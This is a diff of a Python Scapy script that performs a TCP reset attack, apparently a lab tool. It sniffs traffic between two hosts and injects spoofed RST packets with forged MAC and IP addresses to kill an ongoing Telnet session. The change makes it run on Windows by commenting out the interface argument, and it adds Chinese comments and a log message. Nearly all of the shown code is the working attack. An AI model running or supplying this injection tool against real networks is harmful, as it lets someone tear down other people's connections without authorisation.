@@ -28,18 +28,26 @@ def tcp_monitor_callback(pkt):
     b = Ether(src=destination_mac, dst=source_mac) / IP(src=destination_ip, dst=source_ip) / TCP(dport=source_port,
                                                                                                  sport=destination_port,
                                                                                                  flags=4, seq=ack_sn)
-    sendp(a, iface='ens33', verbose=False)
-    sendp(b, iface='ens33', verbose=False)
+    sendp(a,
+          # iface='ens33',  # Windows环境不能使用iface参数
+          verbose=False)
+    sendp(b,
+          # iface='ens33',  # Windows环境不能使用iface参数
+          verbose=False)
 
 
-def tcp_reset(src_ip, dst_ip, dst_port, src_port=None):
+def tcp_reset(src_ip, dst_ip, dst_port,src_port=None):
     if src_port is None:
         match = "src host " + src_ip + " and dst host " + dst_ip + " and dst port " + dst_port
     else:
         match = "src host " + src_ip + " and dst host " + dst_ip + " and src port " + src_port + " and dst port " + dst_port
-    print(match)
-    sniff(prn=tcp_monitor_callback, filter=match, store=0, iface='ens33')
+    print("开始匹配异常流量" + match)
+    sniff(prn=tcp_monitor_callback,
+          filter=match,
+          # iface='ens33',
+          store=0)
 
 
 if __name__ == "__main__":
+    # 使用Linux解释器 & WIN解释器
     tcp_reset('10.1.1.100', '10.1.1.253', '23')
